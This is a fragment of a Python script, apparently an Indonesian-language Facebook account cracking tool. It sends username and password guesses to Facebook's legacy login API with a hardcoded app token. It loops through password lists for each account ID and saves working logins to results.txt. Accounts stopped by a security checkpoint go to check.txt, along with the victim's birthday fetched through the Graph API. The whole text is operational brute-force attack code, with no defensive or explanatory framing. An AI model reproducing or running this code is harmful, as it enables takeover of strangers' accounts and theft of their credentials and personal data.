    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " - " + password)
      print(("\r\033[0;92mRESULT %s - %s %s               "%(username,password,N)))
      ok.append(username + " - " + password)
      save = open("results.txt", "a")
      save.write(str(username) + " - " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " - " + ttl)
        print(("\r\033[0;91mCHECK %s - %s - %s   "%(username,password,ttl)))
        save = open("check.txt", "a+")
        save.write(str(username) + " - " + str(password) + " - "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\033[0m%s-%s \033[0;92mRESULTS %s \033[0;91mCHECK %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end='');sys.stdout.flush()        
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\033[0m%s-%s \033[0;92mRESULTS %s \033[0;91mCHECK %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end='');sys.stdout.flush()


def results(Anak,Kontol):
        if len(Anak) !=0:
                print(("\nRESULTS > "+str(len(Anak))))
        if len(Kontol) !=0:
                print(("\nCHECK > "+str(len(Kontol))))
        if len(Anak) ==0 and len(Kontol) ==0:
                print("\n")
                print(("\nTidak Ada Hasil"))
                
def updatesc():
	os.system("clear")
	banner()
	print(("\nMemperbarui Script"))
	os.system("git pull origin master")
	print(("\nMemperbarui Script Berhasil"))
	exit()

if __name__=="__main__":
	menu()